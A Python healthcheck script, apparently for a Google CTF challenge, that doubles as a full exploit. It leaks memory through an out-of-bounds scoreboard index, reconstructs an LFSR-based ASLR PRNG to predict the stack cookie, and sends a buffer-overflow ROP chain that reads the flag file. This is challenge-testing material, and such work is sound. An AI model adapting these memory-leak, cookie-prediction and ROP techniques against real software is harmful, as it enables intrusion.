#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
#
# Healthcheck that doubles as an exploit.

import pwnlib.tubes
from pwnlib.util.packing import p8, p16, p32, p64
import sys

def get_bit(v, n):
  return (v >> n) & 1

def rollback(rand_state):
  BIAS = 64 - 16

  new_bit = get_bit(rand_state[0], 0)
  bit_64 = (
      1 ^
      new_bit ^
      get_bit(rand_state[0], BIAS + 14) ^
      get_bit(rand_state[0], BIAS + 13) ^
      get_bit(rand_state[0], BIAS + 11)
  )

  rand_state[0] = ((rand_state[0] >> 1) & 0xffffffffffffffff) | (bit_64 << 63)

def rand(rand_state):
  BIAS = 63 - 16

  new_bit = (
      1 ^
      get_bit(rand_state[0], BIAS + 16) ^
      get_bit(rand_state[0], BIAS + 14) ^
      get_bit(rand_state[0], BIAS + 13) ^
      get_bit(rand_state[0], BIAS + 11)
  )

  rand_state[0] = ((rand_state[0] << 1) & 0xffffffffffffffff) | new_bit
  return new_bit

def randnbits(rand_state, n):
  bits = 0
  for _ in range(n):
    bits <<= 1
    bits |= rand(rand_state)
  return bits

def exploit(r):
  # Check basic functionality.
  d = r.recvuntil(b'Your choice?')
  if b'MAIN MENU' not in d:
    sys.exit("Error: Didn't receive menu.")

  r.sendline(b'2')
  d = r.recvuntil(b'Your choice?')
  if b'SCOREBOARD' not in d:
    sys.exit("Error: Didn't receive scoreboard.")

  r.sendline(b'3')
  r.sendline(b'0')
  d = r.recvuntil(b'Your choice?')
  if b'To get this place you need to beat this score: 95' not in d:
    sys.exit("Error: Didn't receive single score.")

  r.sendline(b'1')
  r.sendline(b'1234')
  d = r.recvuntil(b'Your choice?')

  if b'Wrong! Game Over!' not in d:
    sys.exit("Error: Didn't receive game.")

  # Start resolving addresses.
  def mem_at_offset(offset):
    offset = (offset // 8) & 0xffffffffffffffff

    # Assuming we're at main menu.
    r.sendline(b'3')
    r.sendline(f'{offset}'.encode())
    d = r.recvuntil(b'Your choice?')

    d = d.split(b'To get this place you need to beat this score: ')[1]
    d = d.split(b'\n')[0]

    return int(d)

  MASK = 0xfffffffff0000000

  # Read the value of the "winner" variable which points to an array within
  # main.o.
  MAIN_ADDR = mem_at_offset(0x1000) & MASK
  print(f"main.o is at: 0x{MAIN_ADDR:x}")

  def mem_at_addr(addr):
    offset = addr - (MAIN_ADDR + 0x2000)
    return mem_at_offset(offset)

  # Read main.o's PLT to get game.o and guard.o.
  GAME_ADDR = mem_at_addr(MAIN_ADDR + 0x08) & MASK
  GUARD_ADDR = mem_at_addr(MAIN_ADDR + 0x38) & MASK

  print(f"game.o is at: 0x{GAME_ADDR:x}")
  print(f"guard.o is at: 0x{GUARD_ADDR:x}")

  # Read guard.o's PLT to get syscalls.o.
  SYSCALLS_ADDR = mem_at_addr(GUARD_ADDR + 0x08) & MASK

  print(f"syscalls.o is at: 0x{SYSCALLS_ADDR:x}")

  # Read game.o's PLT and a pointer that points to the game banner to get
  # basic.o and res.o.
  BASIC_ADDR = mem_at_addr(GAME_ADDR + 0x08) & MASK
  RES_ADDR = mem_at_addr(GAME_ADDR + 0x2000) & MASK

  print(f"basic.o is at: 0x{BASIC_ADDR:x}")
  print(f"res.o is at: 0x{RES_ADDR:x}")

  # This is enough ASLR data to recover the state after res.o but before
  # debug.o.
  lsfr_state = 0
  lsfr_state |= ((RES_ADDR >> 28) & 0xfff) << 0
  lsfr_state |= ((GAME_ADDR >> 28) & 0xfff) << 12
  lsfr_state |= ((BASIC_ADDR >> 28) & 0xfff) << 24
  lsfr_state |= ((GUARD_ADDR >> 28) & 0xfff) << 36
  lsfr_state |= ((SYSCALLS_ADDR >> 28) & 0xfff) << 48
  lsfr_state |= ((MAIN_ADDR >> 28) & 0xfff) << 60
  lsfr_state &= 0xffffffffffffffff

  # Run the PRNG forward to get debug.o.
  lsfr_copy = [lsfr_state]
  DEBUG_ADDR = randnbits(lsfr_copy, 12) << 28

  print(f"debug.o should be at: 0x{DEBUG_ADDR:x}")
  d = mem_at_addr(DEBUG_ADDR + 0x1000)
  if d != 0x5857c35e57c35f57:
    sys.exit("Error: debug.o changed or wasn't found")
  print("confirmed! debug.o is where it was expected to be")

  # Roll the PRNG back to before main.o's address was selected, this will give
  # the state equal to the cookie.
  print("rolling back LSFR...")
  lsfr_copy = [lsfr_state]
  for _ in range(72):
    rollback(lsfr_copy)

  cookie = lsfr_copy[0]
  print(f"predicted cookie: 0x{cookie:x}")

  # Now we just need to win 11 games to get to the scoreboard...
  print("winning the game...")
  r.sendline(b'1')
  for _ in range(11):
    d = r.recvuntil(b' ?\n')
    d = d.split(b"How much is ")[1].split(b' ')
    a = int(d[0])
    b = int(d[2])
    res = a + b
    print(f"{a} + {b} --> {res}")
    r.sendline(str(res).encode())

  r.sendline(b'1234')  # Bad answer.

  d = r.recvuntil(b')?\n')
  if b'SCOREBOARD!' not in d:
    sys.exit("Error: Didn't win a game or something.")

  print("game won, exploiting buffer overflow...")

  payload = []
  payload.append(b'flag\0')  # This will end up in MAIN_ADDR + 0x2060 + 0x20 * 9
  payload.append(b'A' * (40 - 5))
  payload.append(p64(cookie))
  payload.append(p64(0))  # This is RBP in case I need to control it.

  def rop_set_rdi(v):
    payload.append(p64(DEBUG_ADDR + 0x1000 + 0x01))
    payload.append(p64(v))

  def rop_set_rsi(v):
    payload.append(p64(DEBUG_ADDR + 0x1000 + 0x04))
    payload.append(p64(v))

  def rop_set_rdx(v):
    payload.append(p64(DEBUG_ADDR + 0x1000 + 0x10))
    payload.append(p64(v))

  def rop_set_rax(v):
    payload.append(p64(DEBUG_ADDR + 0x1000 + 0x07))
    payload.append(p64(v))

  def rop_syscall():
    payload.append(p64(SYSCALLS_ADDR + 0x1000 + 0x02))

  def rop_syscall3(syscallno, rdi, rsi, rdx):
    rop_set_rdi(rdi)
    rop_set_rsi(rsi)
    rop_set_rdx(rdx)
    rop_set_rax(syscallno)
    rop_syscall()

  def rop_syscall1(syscallno, rdi):
    rop_set_rdi(rdi)
    rop_set_rax(syscallno)
    rop_syscall()

  rop_syscall3(2, MAIN_ADDR + 0x2060 + 0x20 * 9, 0, 0);  # open("flag")
  rop_syscall3(0, 3, MAIN_ADDR + 0x2000, 64);  # guessing fd is 3
  rop_syscall3(1, 1, MAIN_ADDR + 0x2000, 64);
  rop_syscall1(60, 0);

  payload = b''.join(payload)
  r.sendline(str(len(payload)).encode())
  r.send(payload)

  d = r.recvuntil(b'}').split(b'\n')[-1]
  if not d.startswith(b'CTF{') or not d.endswith(b'}'):
    sys.exit("Error: Didn't get the flag or something.")

  print(f"flag: {d}")
  return

def handle_pow(r):
  print(r.recvuntil(b'python3 '))
  print(r.recvuntil(b' solve '))
  challenge = r.recvline().decode('ascii').strip()
  p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
  solution = p.readall().strip()
  r.sendline(solution)
  print(r.recvuntil(b'Correct\n'))

ip = '127.0.0.1'
port = 1337
if len(sys.argv) == 3:
  ip = sys.argv[1]
  port = int(sys.argv[2])

r = pwnlib.tubes.remote.remote(ip, port)
print(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
  handle_pow(r)

exploit(r)
print('All good')
